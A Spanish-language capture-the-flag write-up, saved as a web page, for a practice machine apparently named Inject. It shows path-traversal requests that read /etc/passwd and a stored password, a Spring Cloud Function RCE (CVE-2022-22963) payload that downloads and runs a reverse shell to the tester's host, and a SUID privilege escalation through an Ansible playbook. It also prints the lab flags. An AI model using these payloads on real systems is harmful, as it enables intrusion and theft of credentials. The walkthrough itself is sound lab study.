<!DOCTYPE html>
<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">

    <title>Máquina 1</title>


    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
    </head>


<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>


    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./inject.jpg"> <span class="mono authors"> <a href="https://secret.club/author/addison" itemprop="name">Inject</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> Feb, 2023 </time><hr><main itemprop="articleBody" style="position: relative">



<h2 id="comprobación-del-sistema-operativo">1. Comprobación del sistema operativo</h2>
<pre><code>python whichSystem.py 10.10.11.204
</code></pre>
<p>Tiene como salida:</p>
<pre class=" language-bash"><code class="prism  language-bash">10.10.11.204 <span class="token punctuation">(</span>ttl -<span class="token operator">&gt;</span> 63<span class="token punctuation">)</span>: Linux
</code></pre>
<p>&nbsp;</p>
<h2 id="descubrimiento-de-puertos-y-servicios">2. Descubrimiento de puertos y servicios</h2>
<pre><code>nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.204
</code></pre>
<p>Obtenemos como salida:</p>
<pre class=" language-bash"><code class="prism  language-bash">Nmap scan report <span class="token keyword">for</span> 10.10.11.204
Host is up, received user-set <span class="token punctuation">(</span>0.035s latency<span class="token punctuation">)</span>.
Scanned at 2023-03-19 12:11:20 CET <span class="token keyword">for</span> 11s
Not shown: 65513 closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>, 20 filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>        syn-ack ttl 63
8080/tcp <span class="token function">open</span>  http-proxy syn-ack ttl 63

Read data files from: /usr/local/bin/<span class="token punctuation">..</span>/share/nmap
Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 10.98 seconds
           Raw packets sent: 66030 <span class="token punctuation">(</span>2.905MB<span class="token punctuation">)</span> <span class="token operator">|</span> Rcvd: 65515 <span class="token punctuation">(</span>2.621MB<span class="token punctuation">)</span>
</code></pre>
<p>&nbsp;</p>
<h2 id="comprobamos-servicios-y-lanzamos-scripts-principales-contra-dichos-puertos">3. Comprobamos servicios y lanzamos scripts principales contra dichos puertos</h2>
<pre><code>nmap -sCV -p22,8080 10.10.11.204
</code></pre>
<pre class=" language-bash"><code class="prism  language-bash">Starting Nmap 7.93SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-03-19 12:12 CET
Nmap scan report <span class="token keyword">for</span> 10.10.11.204
Host is up <span class="token punctuation">(</span>0.034s latency<span class="token punctuation">)</span>.

PORT     STATE SERVICE     VERSION
22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol 2.0<span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
8080/tcp <span class="token function">open</span>  nagios-nsca Nagios NSCA
<span class="token operator">|</span>_http-title: Home
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p>&nbsp;</p>
<h2 id="observamos-la-página-web">4. Observamos la página web</h2>
<p>Observando la página web, nos damos cuenta que en la ruta <code>http://10.10.11.204:8080/upload</code> existe la posibilidad de subir archivos al servidor.</p>
<p>Por lo que empezamos probamos subiendo un archivo <strong>.php</strong>. Pero nos aparece un mensaje de error diciendo que solo acepta archivos de imagen (<code>Only image files are accepted!</code>). Probamos entonces a subir archivos empleando varias técnicas, como pueden ser modificar el nombre del fichero, añadir contenido ejecutable a través de la herramienta exiftool… pero ninguno de estas técnicas tiene efecto.</p>
<p>&nbsp;</p>
<h2 id="lanzamos-un-fuzzer-web">5. Lanzamos un fuzzer web</h2>
<p>Probamos a lanzas un fuzzer web, para que mediante fuerza bruta podamos observar posibles directorios disponibles:</p>
<pre><code>gobuster dir -u http://10.10.11.204:8080/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</code></pre>
<p>Obtenemos entonces que existe un recurso web llamado <code>/release_notes</code>:</p>
<p>Si observamos su contenido, vemos que nos aparecen varios cambios realizados durante las versiones, uno de ellos que se añadieron medidas de protección contra la subida de ficheros, por lo que podemos descartar este tipo de vía.</p>
<p>&nbsp;</p>
<h2 id="probamos-a-subir-una-imagen-válida">6. Probamos a subir una imagen válida</h2>
<p>Observamos que si subimos una imagen al recurso <code>http://10.10.11.204:8080/upload</code> podemos verla mediante la siguiente petición:</p>
<pre><code>GET /show_image?img=test.png
</code></pre>
<p>Por lo que podemos probar si es vulnerable a <strong>Path Traversal (LFI)</strong> y observamos lo siguiente:</p>
<p>Podemos obtener el fichero <code>/etc/passwd</code> del sistema:</p>
<pre><code>GET /show_image?img=../../../../../../../../../../../../etc/passwd HTTP/1.1

    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
    systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
    messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
    syslog:x:104:110::/home/syslog:/usr/sbin/nologin
    _apt:x:105:65534::/nonexistent:/usr/sbin/nologin
    tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
    uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
    tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
    landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
    pollinate:x:110:1::/var/cache/pollinate:/bin/false
    usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
    frank:x:1000:1000:frank:/home/frank:/bin/bash
    lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
    sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
    phil:x:1001:1001::/home/phil:/bin/bash
    fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
    _laurel:x:997:996::/var/log/laurel:/bin/false
</code></pre>
<p>Navegando un poco por el sistema, descubrimos un archivo de autenticación, en concreto el <strong>servicio maven</strong>. Mediante la siguiente petición:</p>
<pre><code>GET /show_image?img=../../../../../../../../../../../../home/frank/.m2/settings.xml HTTP/1.1
Host: 10.10.11.204:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.204:8080/upload
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.9
Connection: close
</code></pre>
<p>Podemos ver en la respuesta que se incluye algunas credenciales de un usuario:</p>
<pre><code>HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 617
Date: Sun, 19 Mar 2023 13:35:15 GMT
Connection: close

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;
  &lt;servers&gt;
    &lt;server&gt;
      &lt;id&gt;Inject&lt;/id&gt;
      &lt;username&gt;phil&lt;/username&gt;
      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;
      &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt;
      &lt;filePermissions&gt;660&lt;/filePermissions&gt;
      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;
      &lt;configuration&gt;&lt;/configuration&gt;
    &lt;/server&gt;
  &lt;/servers&gt;
&lt;/settings&gt;
</code></pre>
<p>Podemos entonces probarnos a conectar mediante <em>ssh</em> con en el usuario <code>phil:DocPhillovestoInject123</code>, pero observamos que no podemos acceder, que las credenciales son incorrectas. Por lo que debemos de buscar otra forma alternativa de acceder al sistema.</p>
<p>&nbsp;</p>
<h2 id="seguimos-observando-archivos-del-sistema">7. Seguimos observando archivos del sistema</h2>
<p>Observando los archivos del sistema, nos damos cuenta que estamos ante un servicio Spring, por lo que accedemos al fichero de configuración de la aplicación web:</p>
<pre><code>GET /show_image?img=../../../../../../////var/www/WebApp/pom.xml HTTP/1.1
</code></pre>
<p>Y obtenemos la siguiente respuesta:</p>
<pre><code>HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 2187
Date: Sun, 19 Mar 2023 13:42:51 GMT
Connection: close

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;parent&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
        &lt;version&gt;2.6.5&lt;/version&gt;
        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
    &lt;/parent&gt;
    &lt;groupId&gt;com.example&lt;/groupId&gt;
    &lt;artifactId&gt;WebApp&lt;/artifactId&gt;
    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
    &lt;name&gt;WebApp&lt;/name&gt;
    &lt;description&gt;Demo project for Spring Boot&lt;/description&gt;
    &lt;properties&gt;
        &lt;java.version&gt;11&lt;/java.version&gt;
    &lt;/properties&gt;
    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.sun.activation&lt;/groupId&gt;
            &lt;artifactId&gt;javax.activation&lt;/artifactId&gt;
            &lt;version&gt;1.2.0&lt;/version&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;
            &lt;scope&gt;runtime&lt;/scope&gt;
            &lt;optional&gt;true&lt;/optional&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
            &lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt;
            &lt;version&gt;3.2.2&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.webjars&lt;/groupId&gt;
            &lt;artifactId&gt;bootstrap&lt;/artifactId&gt;
            &lt;version&gt;5.1.3&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.webjars&lt;/groupId&gt;
            &lt;artifactId&gt;webjars-locator-core&lt;/artifactId&gt;
        &lt;/dependency&gt;

    &lt;/dependencies&gt;
    &lt;build&gt;
        &lt;plugins&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
                &lt;version&gt;${parent.version}&lt;/version&gt;
            &lt;/plugin&gt;
        &lt;/plugins&gt;
        &lt;finalName&gt;spring-webapp&lt;/finalName&gt;
    &lt;/build&gt;

&lt;/project&gt;
</code></pre>
<p>Vemos que nos encontramos antes la versión <code>3.2.2</code> de <strong>Spring</strong>, por lo que si buscamos alguna vulnerabilidad asociada a dicha versión, encontramos la siguiente <code>https://github.com/me2nuk/CVE-2022-22963</code>.</p>
<p>&nbsp;</p>
<h2 id="vulnerabilidad-lfi-spring">8. Vulnerabilidad LFI Spring</h2>
<p>Tal y como nos dice dicho CVE, para explotar dicha vulnerabilidad y poder establecer una <em>revershell</em> deberemos de seguir los siguientes pasos:</p>
<ol>
<li>
<p>Creamos en nuestra máquina local un archivo llamado <code>rever.sh</code> que contendrá lo siguiente:</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token shebang important">#!/bin/bash</span>

<span class="token function">bash</span> -i <span class="token operator">&gt;</span><span class="token operator">&amp;</span> /dev/tcp/10.10.14.87/8443 0<span class="token operator">&gt;</span><span class="token operator">&amp;</span>1
</code></pre>
</li>
<li>
<p>Lanzamos un servidor web en nuestra maquina local, en el directorio de dicho archivo:</p>
<pre><code>sudo python -m http.server 8000
</code></pre>
</li>
<li>
<p>Realizamos la siguiente petición curl a la maquina objetivo, para que obtenga el archivo de revershell:</p>
<pre><code>curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.14.87:8000/rever.sh -o /tmp/rev")' --data-raw 'data' -v
</code></pre>
</li>
<li>
<p>Lanzamos en nuestra máquina local un netcat escuchando en el puerto 8443:</p>
<pre><code>nc -lvp 8443
</code></pre>
</li>
<li>
<p>Lanzamos la siguiente peticion curl a la maquina objetivo, para que se ejecute el script de la revershell</p>
<pre><code>curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/rev")' --data-raw 'data' -v
</code></pre>
<p>Observamos que somos <strong>capaces de obtener acceso con el usuario Frank</strong> al sistema.</p>
</li>
</ol>
<p>&nbsp;</p>
<h2 id="intento-de-encontrar-la-flag-de-usuario">9. Intento de encontrar la flag de usuario</h2>
<p>Si observamos el directorio del usuario <strong>frank</strong>, podemos ver que no encontramos el <em>flag de usuario</em>. Pero recordamos que existia una carpeta <em>.m2</em> con un archivo <code>settings.xml</code>, el cual tenía el siguiente contenido:</p>
<pre class=" language-xml"><code class="prism  language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>settings</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
        <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servers</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>server</span><span class="token punctuation">&gt;</span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>Inject<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">&gt;</span></span>phil<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">&gt;</span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>DocPhillovestoInject123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>privateKey</span><span class="token punctuation">&gt;</span></span>${user.home}/.ssh/id_dsa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>privateKey</span><span class="token punctuation">&gt;</span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filePermissions</span><span class="token punctuation">&gt;</span></span>660<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filePermissions</span><span class="token punctuation">&gt;</span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>directoryPermissions</span><span class="token punctuation">&gt;</span></span>660<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>directoryPermissions</span><span class="token punctuation">&gt;</span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>server</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servers</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>settings</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>Por lo que probamos a autenticarnos como el usuario <strong>phil</strong>, mediante el siguiente comando, introduciendo para ello la contraseña <code>DocPhillovestoInject123</code>:</p>
<pre><code>su phil 
</code></pre>
<p>En este caso si que somos capaces de acceder como el usuario <strong>phil</strong>.</p>
<p>&nbsp;</p>
<h2 id="flag-de-usuario">10. Flag de usuario</h2>
<p>Somos capaces de obtener la flag de usuario -&gt; <em>7ca384cb5958fc7e8801eba7b2b290cc</em></p>
<p>&nbsp;</p>
<h2 id="escalada-de-privilegios">11. Escalada de privilegios</h2>
<p>Si lanzamos el ejecutable <code>linpeas.sh</code> en el equipo objetivo (luego de transferirlo desde nuestra máquina local), vemos que nos aparece el siguiente resultado:</p>
<pre><code>╔══════════╣ Unexpected in /opt (usually empty)
total 12
drwxr-xr-x  3 root root 4096 Oct 20 04:23 .
drwxr-xr-x 18 root root 4096 Feb  1 18:38 ..
drwxr-xr-x  3 root root 4096 Oct 20 04:23 automation
</code></pre>
<p>Si nos dirigimos a dicha ruta, podemos ver un archivo con el siguiente nombre <code>/opt/automation/tasks/playbook_1.yml</code>, y con el siguiente contenido:</p>
<pre><code>phil@inject:/opt/automation/tasks$ cat playbook_1.yml 
    - hosts: localhost
      tasks:
      - name: Checking webapp service
        ansible.builtin.systemd:
          name: webapp
          enabled: yes
          state: started
</code></pre>
<p>&nbsp;</p>
<h2 id="explotación-de-ansible">12. Explotación de Ansible</h2>
<p>Buscando por internet algun exploit relacionado con el servicio <strong>Ansible</strong>, nos encontramos con el del siguiente enlace <code>https://gtfobins.github.io/gtfobins/ansible-playbook/</code>. Por lo que procedemos a crear el archivo <code>/opt/automation/tasks/pe.yml</code>, con el siguiente contenido:</p>
<pre><code>- hosts: localhost
  tasks:
    - name: Priv esc
      ansible.builtin.shell: |
        chmod +s /bin/bash
      become: true
</code></pre>
<p>Una vez creado y guardado dicho archivo, debemos esperar varios minutos a que se lance automáticamente la tarea de Ansible y a continuacion deberemos ejecutar el siguiente comando para iniciar una nueva instancia de la <em>shell de Bash</em>.</p>
<pre><code>bash -p
</code></pre>
<p>Con esto observamos como somos capaces de obtener una shell con el <strong>usuario root</strong>.</p>
<p>&nbsp;</p>
<h2 id="obtención-flag-usuario-root">13. Obtención flag usuario root</h2>
<p>Somos entonces capaces de obtener el flag del usuario <strong>root</strong> -&gt; <em>19a05fbdea58d9341b2ed447466c752e</em></p>










<p>&nbsp;</p><p>&nbsp;</p>
</div>
     <div class="footer-credits" style="display: flex; justify-content: flex-end">
        <a> Made by Juan González </a>
    </div>
</div>
</body></html>
